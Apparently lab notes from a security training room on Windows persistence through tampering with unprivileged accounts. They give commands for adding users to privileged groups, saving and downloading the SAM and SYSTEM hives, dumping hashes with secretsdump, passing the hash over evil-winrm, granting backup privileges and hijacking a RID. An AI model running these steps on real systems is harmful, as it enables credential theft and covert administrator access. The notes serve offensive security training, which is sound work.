# Introduction 

When you first gain access to a target’s internal network, one of your top priorities is establishing **persistence**—a reliable way to regain access without having to exploit the system again. Persistence ensures you don’t lose your foothold before reaching high‑value assets.

Attackers rush to establish persistence because:

- **Re‑exploitation may fail**: Some exploits are unstable and only work once.
- **Initial access is hard to repeat**: Phishing or social engineering might not succeed a second time.
- **Defenders react quickly**: Once suspicious activity is detected, vulnerabilities may be patched or credentials rotated.

While attackers could reuse stolen credentials, those can change. More covert persistence techniques make it harder for defenders to remove the attacker

## Tampering With Unprivileged Accounts

- **GOAL**
However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

#NOTE  When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing **Reconnect**.  

Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.

#### Assign Group Memberships
assume we have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group.

```Command Prompt
C:\> net localgroup administrators thmuser0 /add
```
**Note**: This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If that looks too suspicious, we can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL
- Adding the account to the Backup Operators group
```Command Prompt
C:\> net localgroup "Backup Operators" thmuser1 /add
```

- We add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups to be able to RDP or WinRM back to the machine
```Command Prompt
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

- Connecting from the attacker machine with WinRM
```linux
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```
**Note**: if you are using WinRM, you are possible to confined to a limited access token with no administrative privileges.

- To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
```Command Prompt
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```linux
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
```

```linux
*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
```

```linux
*Evil-WinRM* PS C:\> download system.bak
```

```linux
*Evil-WinRM* PS C:\> download sam.bak
```
**Note:** If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

- With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools
```linux
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
```linux
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

#### Special Privileges and Security Descriptors
A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself.


In the case of the Backup Operators group, it has the following two privileges assigned by default:

- **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
- **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

- We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:
```powershell
secedit /export /cfg config.inf
```
We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

- We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```powershell
secedit /import /cfg config.inf /db config.sdb
```

```Powershell
secedit /configure /db config.sdb /cfg config.inf
```

- To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this)
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
*Note*: This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy**

```Command Prompt
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
```powershell
net user thmuser2
```

#### RID Hijacking
Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.

- To find the assigned RIDs for any user, you can use the following command:
```Command Prompt
wmic useraccount get name,sid
```

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:

```Command Prompt
PsExec64.exe -i -s regedit
```

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine

Note: the RID is stored using little-endian notation, so its bytes appear reversed.

Note: using rdp to connect to the thmuser3
```Powershell
xfreerdp /v:MACHINE-IP /u:thmuser3 /p:Password321
```
